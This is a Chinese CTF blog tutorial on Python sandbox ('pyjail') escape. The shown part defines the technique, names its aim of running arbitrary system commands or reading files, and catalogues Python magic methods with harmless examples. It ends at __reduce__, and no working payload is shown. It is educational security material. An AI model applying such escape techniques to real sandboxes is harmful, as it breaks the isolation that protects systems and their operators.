<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="允许一切如其所是">
    <meta name="author" content="C3ngH">
    
    <title>
        
            Python沙盒逃逸深度学习 |
        
        C3ngH&#39;s B10g
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","links":"/links"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"CTF Misc / A1natas Team / V＆N Team / More","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/zch050217","weixin":null,"qq":"./images/qqQRcode.jpg","weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈&运维&开发&安全@r3kapig","link":"https://carbo.ink/","description":"lfy,wcnm!","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"title":"Other CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner(ROIS✌","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_","link":"https://sun1028.top/","description":"我也不知道要啥描述","avatar":"http://39.107.115.191/wp-content/uploads/2025/01/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250106120848.jpg"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU A1natas Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                </a>
            
            <a class="site-name border-box" href="/">
               C3ngH&#39;s B10g
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                首页
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                归档
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                标签
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                分类
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/links">
                                
                                友链
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            首页
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            归档
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                            标签
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                            分类
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
                            
                            友链
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        Python沙盒逃逸深度学习
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">C3ngH</span>
                                
                                    <span class="author-badge">Lv3</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2024-10-26 09:51:56</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Sat Jan 18 2025 03:41:58 GMT+0800">2025-01-18 03:41:58</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Misc/">Misc</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>26.3k 字</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>132 分钟</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p>参考链接：</p>
<ul>
<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132436072" >https://blog.csdn.net/Jayjay___/article/details/132436072<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://ch3mtr4ils.cn/2024/07/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#HNCTF2022-pyjail" >Python沙箱逃逸 | Chemtrails<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>特别鸣谢：<a class="link"   target="_blank" rel="noopener" href="https://void2eye.fun/" >void2eye<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="什么是Pyjail">什么是Pyjail</h3>
<p>Python沙箱逃逸是CTF题目中比较常见的类型，是指在受限环境中（通常称为“沙箱”）执行Python代码时，通过某种手段绕过安全限制，访问或修改不应被访问的资源或执行不应被执行的操作的过程，<strong>最终目标是执行系统任意命令，或读写文件。</strong></p>
<h3 id="Pyjail的实现原理">Pyjail的实现原理</h3>
<p>Python有一些特性，例如：Python的类均继承自<code>object</code>基类，Python的类中有一些静态方法，如<code>bytes.fromhex</code>、<code>int.frombytes</code>等，对于这些类的实例可以直接调用这些方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;1&#x27;</span>.fromhex(<span class="string">&#x27;1234&#x27;</span>) </span><br><span class="line"><span class="comment"># b&#x27;\x124&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>特例：整数参数不支持这种操作，如<code>1.frombytes(b'\x124')</code>会报错。</p>
</blockquote>
<p>Python的类中具有一系列的魔术方法，其机制类似于PHP的魔术方法。例如对象<code>a</code>使用<code>a+b</code>时，其实是尝试调用了<code>a.__add__(b)</code>、</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a = <span class="number">50</span></span><br><span class="line">    b = <span class="number">60</span></span><br><span class="line">    c = <span class="number">70</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;a&#x27;: 50, &#x27;b&#x27;: 60, &#x27;c&#x27;: 70, &#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;__doc__&#x27;: None&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Python魔术方法">Python魔术方法</h3>
<ol>
<li>
<p><strong><code>__init__</code></strong>：对象初始化方法，在创建对象时调用。通常用来初始化对象的属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __init__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__repr__</code></strong>：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__str__</code></strong>：返回对象的“非正式”或友好字符串表示形式。通常可以通过调用 <code>str(object)</code> 或 <code>print(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return f&quot;Example with value &#123;self.value&#125;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__len__</code></strong>：返回对象的长度。常用于实现自定义容器类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __len__(self):</span><br><span class="line">        return len(self.items)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getitem__</code></strong>：获取对象中指定键的值。通常用于实现自定义的索引操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __getitem__(self, key):</span><br><span class="line">        return self.items[key]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__setitem__</code></strong>：设置对象中指定键的值。常用于实现可变容器。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __setitem__(self, key, value):</span><br><span class="line">        self.items[key] = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__delitem__</code></strong>：删除对象中指定键的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __delitem__(self, key):</span><br><span class="line">        del self.items[key]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__iter__</code></strong>：返回一个迭代器对象。通常用于实现可迭代对象。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return iter(self.items)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__contains__</code></strong>：检查对象是否包含指定的元素。通常用于 <code>in</code> 操作符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __contains__(self, item):</span><br><span class="line">        return item in self.items</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__call__</code></strong>：使实例对象可以像函数一样被调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __call__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__base__</code></strong>：返回当前类的基类。如 <code>SomeClass.__base__</code> 会返回 <code>&lt;class 'object'&gt;</code>。</p>
</li>
<li>
<p><strong><code>__subclasses__()</code></strong>：查看当前类的子类组成的列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Example.__subclasses__()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__builtins__</code></strong>：以一个集合的形式查看其引用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import builtins</span><br><span class="line">dir(builtins)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getattr__</code></strong>、<strong><code>__setattr__</code></strong>、<strong><code>__delattr__</code></strong>：处理对象属性的获取、设置和删除。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattr__(self, name):</span><br><span class="line">        return f&quot;&#123;name&#125; not found&quot;</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        self.__dict__[name] = value</span><br><span class="line"></span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        del self.__dict__[name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__enter__</code></strong>、<strong><code>__exit__</code></strong>：定义在使用 <code>with</code> 语句时对象的上下文管理行为。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __enter__(self):</span><br><span class="line">        # Setup code</span><br><span class="line">        return self</span><br><span class="line"></span><br><span class="line">    def __exit__(self, exc_type, exc_val, exc_tb):</span><br><span class="line">        # Teardown code</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__class__</code></strong>：指向对象的类。可以用来获取对象的类信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__class__)  # &lt;class &#x27;__main__.Example&#x27;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__delattr__</code></strong>：当试图删除对象的属性时调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        print(f&quot;Deleting attribute &#123;name&#125;&quot;)</span><br><span class="line">        super().__delattr__(name)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__dict__</code></strong>：包含对象（但不包括从类继承的属性）的属性字典。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__dict__)  # &#123;&#x27;attribute&#x27;: value&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__dir__</code></strong>：由 <code>dir()</code> 函数调用，用于列出对象的属性和方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __dir__(self):</span><br><span class="line">        return [&#x27;custom_attribute&#x27;, &#x27;another_attribute&#x27;]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__doc__</code></strong>：类或方法的文档字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    &quot;&quot;&quot;This is a docstring.&quot;&quot;&quot;</span><br><span class="line">print(Example.__doc__)  # &quot;This is a docstring.&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__eq__</code></strong>：实现对象的相等性比较，通常由 <code>==</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return self.value == other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__format__</code></strong>：用于实现自定义的字符串格式化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __format__(self, format_spec):</span><br><span class="line">        return f&quot;Formatted value: &#123;self.value:&#123;format_spec&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__ge__</code></strong>：实现对象的“大于等于”比较，通常由 <code>&gt;=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ge__(self, other):</span><br><span class="line">        return self.value &gt;= other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getattribute__</code></strong>：在访问对象属性时调用，优先于 <code>__getattr__</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattribute__(self, name):</span><br><span class="line">        print(f&quot;Accessing attribute &#123;name&#125;&quot;)</span><br><span class="line">        return super().__getattribute__(name)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getstate__</code></strong>：用于对象序列化时返回要保存的状态。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getstate__(self):</span><br><span class="line">        state = self.__dict__.copy()</span><br><span class="line">        return state</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__gt__</code></strong>：实现对象的“大于”比较，通常由 <code>&gt;</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __gt__(self, other):</span><br><span class="line">        return self.value &gt; other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__hash__</code></strong>：实现对象的哈希值计算，通常由 <code>hash()</code> 函数调用。对象的哈希值应保持不变。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __hash__(self):</span><br><span class="line">        return hash(self.value)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__init_subclass__</code></strong>：在子类化时调用，可以用来自定义子类的行为。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    def __init_subclass__(cls, **kwargs):</span><br><span class="line">        super().__init_subclass__(**kwargs)</span><br><span class="line">        cls.custom_attribute = True</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__le__</code></strong>：实现对象的“小于等于”比较，通常由 <code>&lt;=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __le__(self, other):</span><br><span class="line">        return self.value &lt;= other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__lt__</code></strong>：实现对象的“小于”比较，通常由 <code>&lt;</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __lt__(self, other):</span><br><span class="line">        return self.value &lt; other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__module__</code></strong>：指向定义类的模块名称。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line">print(Example.__module__)  # __main__</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__ne__</code></strong>：实现对象的不等性比较，通常由 <code>!=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ne__(self, other):</span><br><span class="line">        return self.value != other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__new__</code></strong>：创建并返回一个新对象实例，通常在对象实例化时调用，优先于 <code>__init__</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __new__(cls, *args, **kwargs):</span><br><span class="line">        instance = super().__new__(cls)</span><br><span class="line">        return instance</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__reduce__</code></strong>：用于定义对象序列化的行为，返回一个元组来帮助对象序列化。</p>
